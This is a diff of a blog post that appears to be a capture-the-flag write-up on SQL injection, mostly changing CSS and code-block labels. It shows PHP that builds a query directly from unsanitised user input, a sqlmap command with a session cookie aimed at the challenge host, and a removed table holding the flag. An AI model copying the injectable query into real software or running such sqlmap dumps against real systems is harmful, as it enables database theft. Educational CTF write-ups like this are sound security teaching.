@@ -10,7 +10,8 @@ author: Tina Ismail
 ---
 <style>
     body{
-        background-image:url(../assets/img/scroll.png);
+        background-image:url(../assets/img/scroll.jpg);
+        background-size:contain;
     }
     p {
         font-family: "Trebuchet MS", serif;
@@ -30,9 +31,26 @@ author: Tina Ismail
     *{
         color:#141210;
     }
-    pre, code{
-        color:white;
-        background-color:black;
+        /* Update your existing pre, code rule */
+    pre, code, .highlight pre, .highlighter-rouge pre {
+        color: white;
+        background-color: black;
+        padding: 1em;
+        border-radius: 4px;
+        overflow-x: auto;
+    }
+
+    /* Style inline code differently if needed */
+    code {
+        padding: 0.2em 0.4em;
+        font-size: 85%;
+    }
+
+    /* Ensure code inside highlighted blocks is also styled */
+    .highlight code, .highlighter-rouge code {
+        background-color: transparent;
+        color: white;
+        padding: 0;
     }
     img{
         margin:auto;
@@ -54,7 +72,7 @@ SQL is the glue that binds it all together, and it stands for Structured Query L
 
 Below is a standard SQL query within a php script. The query is `"SELECT * FROM users WHERE username='$username'"` where username is a field populated by user input.
 
-```
+```php
 <?php
     $username = $_GET['username'];
     $result = mysql_query("SELECT * FROM users WHERE username='$username'");
@@ -72,13 +90,13 @@ With this in mind, we set the username field to slime001, and attempt a sql inje
 
 ![Slime001's Mythical Shop](/assets/img/issessions26-sqli-shop.png)
 
-```
+```bash
 sqlmap -u "https://issessionsctf-sql-injection-challenge.chals.io/items/?search=1%3D%3D1" --cookie="session=eyJ1c2VyX2lkIjoxfQ.aZtS0w.ROwLPykA6ybPz7_UPr5jePYct6o" -p search -T items -a --batch
 ```
 
 The output of this command is a long one, but if you bear with it it tells you all you need, including the true password for our user slime001.
 
-```
+```bash
         ___
        __H__
  ___ ___[']_____ ___ ___  {1.9.11#stable}
@@ -159,15 +177,7 @@ Table: items
 
 [*] ending @ 14:27:36 /2026-02-22/
 ```
-It's a bit hard to make sense of in the above SQLMAP output snippet, so here is the table items in the current database named `SQLite_masterdb`. Look closely for the flag. Did you catch it?<br>
-
-| id | info | name | image | price | hidden |
-|----|------|------|-------|-------|--------|
-| 1 | A legendary weapon forged through magic or ancient ritual, its blade constantly engulfed in living fire. The flames do not consume the wielder but instead respond to their will, intensifying with emotion or combat prowess. Each strike scorches armor and flesh alike, leaving burning wounds and radiant trails of heat in the air. Often tied to elemental fire spirits, dragons, or lost civilizations, the sword is both a symbol of destructive power and a test of mastery, rewarding only those strong enough to control its blazing fury. | Sword of Flames | images/red sword.png | 1000 | 0 |
-| 2 | A modestly enchanted blade shaped by natural forces rather than raw elemental power. Its magic is subtle, allowing the sword to remain sharp, resilient, and slightly enhanced by the vitality of the land it comes from. Vines, bark-like patterns, or faint green hues may trace the blade, and its strikes can cause minor effects such as accelerated decay of armor or brief rooting of enemies. Favored by rangers and travelers, the sword is practical and dependable, valued more for its steady usefulness and connection to the natural world than for overwhelming strength or spectacle. | Sword of Nature | images/green sword.png | 500 | 0 |
-| 3 | An ancient relic said to be penned in fire and scale by the first dragons at the dawn of magic. Its wyrm-hide parchment is etched with living runes that shift and rearrange themselves, revealing forbidden truths only to those clever—or reckless—enough to read between the lines. Legends claim the scroll does not grant power directly, but instead teaches how to bend the laws of magic, slipping commands into reality the way a rogue spell slips past a ward. Inscribed deep within its final ciphered verse lies the mark of its mastery, a phrase known to scholars and spellbreakers alike: FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}, a reminder that even the strongest systems can fall to a well-crafted incantation. | Dragon Scroll | images/dragon scroll.png | 500 | 1 |
-| 4 | A finely crafted blade imbued with the steady, relentless power of the ocean. Its magic is neither subtle nor overwhelming, manifesting in cool hues, faint mist, and a constant damp chill along the edge. The sword strikes with the weight of crashing waves, wearing down foes through persistence rather than sudden force, and its enchantment allows it to cut cleanly through armor and resist corrosion or breakage. Favored by sailors, coastal warriors, and tide-bound guardians, the sword embodies balance—strong and reliable, yet restrained—drawing its strength from the endless patience and quiet dominance of the sea. | Sword of the Sea | images/blue sword.png | 700 | 0 |
-
+The flag is in the table items in the current database named `SQLite_masterdb`. Look closely, did you find it?
 <h3>
 <details>
 <summary>The Enchantment We Need</summary>
